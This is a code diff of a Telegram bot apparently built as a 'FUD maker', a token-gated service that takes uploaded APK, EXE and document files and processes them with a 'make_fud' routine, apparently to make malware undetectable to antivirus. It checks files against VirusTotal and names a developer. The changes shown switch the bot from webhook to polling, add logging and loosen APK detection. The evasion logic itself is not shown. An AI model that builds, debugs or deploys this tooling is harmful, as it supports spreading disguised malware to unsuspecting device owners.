@@ -28,7 +28,6 @@ ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
 DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
 VT_API_KEY = os.environ.get("VT_API_KEY", "")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "")
-WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
 
 if not os.path.exists(DATA_DIR):
     DATA_DIR = "data"
@@ -42,10 +41,6 @@ DB_PATH = os.path.join(DATA_DIR, "fud_maker.db")
 # ============ DEVELOPER ============
 DEVELOPER = "@benji_v1"
 
-# ============ GLOBAL LOOP ============
-loop = asyncio.new_event_loop()
-asyncio.set_event_loop(loop)
-
 # ============ FLASK ============
 app = Flask(__name__)
 start_time = time.time()
@@ -57,39 +52,6 @@ def index():
 @app.route('/health')
 def health():
     return jsonify({"status": "ok"})
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    global application, loop
-    
-    # Recreate loop if closed
-    if loop.is_closed():
-        print("Loop was closed! Recreating...")
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        threading.Thread(target=run_bot, daemon=True).start()
-        return "Reconnecting...", 503
-    
-    if application is None:
-        return "Application not ready", 503
-
-    try:
-        data = request.get_json(force=True)
-        update = Update.de_json(data, application.bot)
-        
-        future = asyncio.run_coroutine_threadsafe(
-            application.process_update(update),
-            loop
-        )
-        future.result(timeout=15)
-        return "OK", 200
-    except asyncio.TimeoutError:
-        return "Timeout", 504
-    except Exception as e:
-        print(f"Webhook error: {e}")
-        import traceback
-        traceback.print_exc()
-        return f"Error: {e}", 500
 
 # ============ DATABASE ============
 def init_db():
@@ -682,6 +644,7 @@ async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
 
 # ============ HANDLERS ============
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    print(f"🔄 /start called by {update.effective_user.id}")
     user = update.effective_user
     user_id = str(user.id)
 
@@ -817,6 +780,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     user = update.effective_user
     user_id = str(user.id)
+
+    print(f"🔄 Button clicked: {query.data} by {user_id}")
 
     is_admin_user = is_admin(user_id)
     if is_admin_user:
@@ -1002,12 +967,25 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(user.id)
     token = context.user_data.get('token')
 
+    print(f"📥 Received document from {user_id}")
+
     if not is_admin(user_id) and not (token and validate_token(token)):
         await update.message.reply_text("Invalid token. Send /start.")
         return ConversationHandler.END
 
     doc = update.message.document
-    if not doc or not doc.file_name.endswith('.apk'):
+    if not doc:
+        await update.message.reply_text("No document found.")
+        return WAITING_APK
+
+    # Better APK detection
+    is_apk = False
+    if doc.file_name and doc.file_name.lower().endswith('.apk'):
+        is_apk = True
+    if doc.mime_type and 'apk' in doc.mime_type.lower():
+        is_apk = True
+
+    if not is_apk:
         keyboard = [[get_cancel_button()]]
         await update.message.reply_text(
             "Please send a valid APK file.",
@@ -1015,24 +993,27 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return WAITING_APK
 
+    print(f"✅ APK detected: {doc.file_name}")
     status_msg = await update.message.reply_text("Processing APK...\n\nStarting...")
 
     temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
     apk_path = os.path.join(temp_dir, doc.file_name)
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(apk_path)
+    print(f"✅ Downloaded APK to {apk_path}")
 
     async def update_progress(text):
         try:
             await status_msg.edit_text(f"Processing APK...\n\n{text}")
         except Exception as e:
-            pass
+            print(f"Progress update error: {e}")
 
     def sync_progress(text):
         asyncio.create_task(update_progress(text))
 
     maker = FUDApkMaker(apk_path)
     result = maker.make_fud(progress_callback=sync_progress)
+    print(f"✅ APK processing result: {result['success']}")
 
     if not result['success']:
         await status_msg.edit_text(f"Build failed\n\n{result['error']}")
@@ -1088,6 +1069,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if maker.work_dir and os.path.exists(maker.work_dir):
         shutil.rmtree(maker.work_dir, ignore_errors=True)
 
+    print(f"✅ APK build {build_id} completed!")
     return ConversationHandler.END
 
 async def handle_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1296,10 +1278,10 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Cancelled. Send /start to begin.")
     return ConversationHandler.END
 
-# ============ BOT RUNNER ============
 # ============ BOT RUNNER — POLLING MODE ============
 def run_bot():
-    global application, loop
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
 
     async def bot_main():
         global application
@@ -1323,7 +1305,7 @@ def run_bot():
             ],
             states={
                 WAITING_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token)],
-                WAITING_APK: [MessageHandler(filters.Document.APK, handle_apk)],
+                WAITING_APK: [MessageHandler(filters.Document.ALL, handle_apk)],  # ALL to catch all documents
                 WAITING_EXE: [MessageHandler(filters.Document.ALL, handle_exe)],
                 WAITING_DOC: [MessageHandler(filters.Document.ALL, handle_doc)],
                 WAITING_GENERATE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_generate_token)],
@@ -1336,7 +1318,7 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # ✅ Force delete webhook to avoid conflicts
+        # Delete webhook to avoid conflicts
         print("Deleting webhook...")
         try:
             await application.bot.delete_webhook(drop_pending_updates=True)
@@ -1350,12 +1332,12 @@ def run_bot():
         await application.initialize()
         await application.start()
 
-        # ✅ Poll with extended timeouts for APK processing
+        # Poll with extended timeouts for APK processing
         await application.updater.start_polling(
             drop_pending_updates=True,
             allowed_updates=['message', 'callback_query'],
             poll_interval=1.0,
-            timeout=120,           # 2 minutes for long APK builds
+            timeout=120,
             read_timeout=120,
             write_timeout=120,
             connect_timeout=60
@@ -1381,7 +1363,7 @@ def run_bot():
                 print(f"Health check error: {e}")
             await asyncio.sleep(10)
 
-    # Run on persistent loop with retry
+    # Run with retry
     while True:
         try:
             loop.run_until_complete(bot_main())
@@ -1391,7 +1373,8 @@ def run_bot():
             traceback.print_exc()
             print("Restarting in 5 seconds...")
             time.sleep(5)
-
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
 
 # ============ MAIN ============
 if __name__ == '__main__':
@@ -1405,7 +1388,6 @@ if __name__ == '__main__':
 
     def run_flask():
         port = int(os.environ.get("PORT", 8080))
-        # No webhook routes needed — just health checks
         app.run(host='0.0.0.0', port=port, debug=False)
 
     # Start Flask in a separate thread
